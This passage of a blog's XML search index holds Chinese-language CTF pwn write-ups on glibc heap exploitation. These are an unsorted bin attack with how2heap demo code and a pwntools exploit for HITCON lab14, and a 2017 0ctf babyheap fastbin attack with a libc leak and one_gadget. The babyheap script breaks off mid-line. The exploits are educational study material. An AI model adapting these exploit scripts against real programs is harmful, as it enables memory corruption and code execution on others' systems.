  mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001173 &lt;+42&gt;:    mov    esi,eax</span><br><span class="line">0x0000000000001175 &lt;+44&gt;:    lea    rax,[rip+0xe88]        # 0x2004</span><br><span class="line">0x000000000000117c &lt;+51&gt;:    mov    rdi,rax</span><br><span class="line">0x000000000000117f &lt;+54&gt;:    mov    eax,0x0</span><br><span class="line">0x0000000000001184 &lt;+59&gt;:    call   0x1050 &lt;printf@plt&gt;</span><br><span class="line">0x0000000000001189 &lt;+64&gt;:    mov    eax,0x0</span><br><span class="line">0x000000000000118e &lt;+69&gt;:    leave  </span><br><span class="line">0x000000000000118f &lt;+70&gt;:    ret    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Inline Asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unsorted Bin Attack</title>
      <link href="/2023/03/21/Unsorted-Bin-Attack/"/>
      <url>/2023/03/21/Unsorted-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="unsorted-bin-来源"><a href="#unsorted-bin-来源" class="headerlink" title="unsorted bin 来源"></a>unsorted bin 来源</h2><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul><li>Unsorted Bin在使用过程中，采用的遍历顺序是FIFO（先进先出），即挂进链表的时候依次从Unsorted bin的头部向尾部挂，取的时候是从尾部向头部取</li><li>在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中</li></ul><p>我们之前做题时其实也用到了unsortedbin，去进行unlink又或去泄露libc，当时我并没有用libcserach，是因为libcsearch不支持main_arena符号，但是是支持__malloc_hook的，mallochook又在mainarena-0x10处，我们可以利用malloc_hook去定位libc</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>看一下how2heap的 unsorted_bin_attack</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsigned long value into stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span></span><br><span class="line">      <span class="string">&quot;attacks, such as rewriting the &quot;</span></span><br><span class="line">      <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid &quot;</span></span><br><span class="line">                  <span class="string">&quot;consolidating the top chunk with&quot;</span></span><br><span class="line">                  <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsorted bin with its bk pointer &quot;</span></span><br><span class="line">                  <span class="string">&quot;point to %p\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span></span><br><span class="line">                  <span class="string">&quot;victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span></span><br><span class="line">                  <span class="string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span></span><br><span class="line">                  <span class="string">&quot;this time, target should has already been &quot;</span></span><br><span class="line">                  <span class="string">&quot;rewrite:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="type">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321151820498.png" alt="image-20230321151820498"></p><blockquote><p>这里说下这个指针问题</p><p>p[1] &#x3D; (unsigned long)(&amp;target_var - 2);</p><p>p的类型是一个unsigned long *</p><p>tartget_var类型是unsigned long，&amp;后也是unsigned long*</p><p>所以是在(char *) p+0x8位置写入(char *)tartget_var-0x10</p></blockquote><p>现象就是我们在free掉p后将p的bk改为了target_var-0x10位置，让后我们的target_var位置被写入了unsortedbin地址</p><p>具体为什么会我们去下源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">         unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p>最关键的就是这句，由于unsortedbin是fifo的数据结构，我们再次malloc会把之前的chunk拿出来，并操作链表结构</p><p>unsorted_chunks(av)是一个函数定位到我们unsortedbin位置，把他的bk改为bck这里的bck是我们要拿出chunk的bk也就是我们改造过的地址，再把我们改造过的地址的fd(+0x10)写为unsortedbin地址，此时目的达到了，unsortedbin链表也坏掉了，不过和我们没关系&gt;_&lt;</p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/heap&gt; checksec magicheap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/heap/magicheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>没什么好说的，有后门函数，edit堆时存在堆溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">    l33t();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们刚说的漏洞屁用没有，就是可以随意把一个地址改一个大数字</p><p>注意不被topchunk合并，溢出把bk覆盖为magic-0x10，剩下交给管理器就行了</p><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321154447592.png" alt="image-20230321154447592"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">create_heap(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017-0ctf-babyheap</title>
      <link href="/2023/03/20/2017-0ctf-babyheap/"/>
      <url>/2023/03/20/2017-0ctf-babyheap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec babyheap </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/babyheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>刚开始的init_my会利用&#x2F;dev&#x2F;urandom随机函数用mmap随机映射一块内存给我们存放指针，没有了确定地址，我们就不好去构成unlink攻击</p><p>allocate()根据我们输入的size构成如下一个结构体，把指针放在mmap的堆上</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> chunk           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> inuse           dq ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> ptr             dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> chunk           ends</span><br></pre></td></tr></table></figure><p>fill()也会根据我们的size进行读写，任意堆溢出，这就好办了</p><p>freechunk()挺好的,该置零的都置零</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">a1[v2].size = <span class="number">0LL</span>;</span><br><span class="line"><span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">result = (__int64)&amp;a1[v2];</span><br><span class="line">*(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><h2 id="unsort-bin泄露libc"><a href="#unsort-bin泄露libc" class="headerlink" title="unsort bin泄露libc"></a>unsort bin泄露libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>这里我们申请五个堆</p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103256014.png" alt="image-20230320103256014" style="zoom:67%;"><p>我们free(2)free(1)后形成单链表</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103408525.png" alt="image-20230320103408525"></p><p>由于我们可以利用堆溢出chunk0去一改写chunk1，改写1的fd为，由于堆一般都是以4k对齐的，我们可以根据申请堆的大小猜测处chunk2和chunk4只有最后一个字节0x80的差距</p><p><code>payload = 0x10 * b&#39;a&#39; + p64(0) + p64(0x21) + p8(0x80)</code>即可</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103540783.png" alt="image-20230320103540783"></p><p>这样我们申请两次就可以拿到chunk4，我们需要改写大小绕过fastbin0x20的检测</p><p>堆溢出chunk3即可<code>payload = 0x10 * b&#39;b&#39; + p64(0) + p64(0x21)</code></p><p>allocate(0x10)<br>allocate(0x10)</p><p>把chunk2分配到chunk4数据区</p><p>这时候释放chunk4之前，要再申请一个堆防止unsorted bin的chunk4与topchunk合并，并把chunk4的大小溢出为0x91进入unsortedbin，输出chunk2就能拿到unsortbin地址</p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103711935.png" alt="image-20230320103711935" style="zoom: 80%;"><p>通过固定偏移找到libc基址</p><h2 id="切割chunk-malloc-hook"><a href="#切割chunk-malloc-hook" class="headerlink" title="切割chunk malloc_hook"></a>切割chunk malloc_hook</h2><p>这个时候我们的chunk2是可以控制chunk4的data区，这就需要我们把chunk4丢到fastbin的链表中，实现任意地址malloc，但是chunk4现在再unsortbin的循环链表里</p><p>我们可以利用ptmalloc2特性<strong>当fastbin大小里没有合适大小的chunk，会去unsorted bin找合适大小的块或者切割合适大小的块</strong></p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">void</span>* x = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止和topchunk合并</span></span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">    <span class="type">void</span>* y = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br></pre></td></tr></table></figure><p>malloc(0x10)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320111817704.png" alt="image-20230320111817704"></p><p>free(x)</p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320111914703.png" alt="image-20230320111914703" style="zoom:67%;"><p>void* y &#x3D; malloc(0x60);</p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320111955487.png" alt="image-20230320111955487" style="zoom:67%;"><p>可以看到直接分割</p></blockquote><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103948398.png" alt="image-20230320103948398"></p><p>0x7f我们需要伪造0x60大小chunk，直接一步达到要求</p><p>allocate(0x60) #idx4<br>free(4)</p><p>再把fakechunk写入</p><p>ake_chunk_addr &#x3D; main_arena - 0x33<br>fake_chunk &#x3D; p64(fake_chunk_addr)<br>fill(2, len(fake_chunk), fake_chunk)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320112319902.png" alt="image-20230320112319902"></p><p>allocate(0x60)  # idx 4<br>allocate(0x60)  # idx 6</p><p>得到chunk</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>写入onegadget</p><p>one_gadget_addr &#x3D; libc + 0x4526a<br>payload &#x3D; 0x13 * b’a’ + p64(one_gadget_addr)<br>fill(6, len(payload), payload)</p><p>继续跑路</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320110015505.png" alt="image-20230320110015505"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./babyheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28529&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 2</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment"># idx5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span 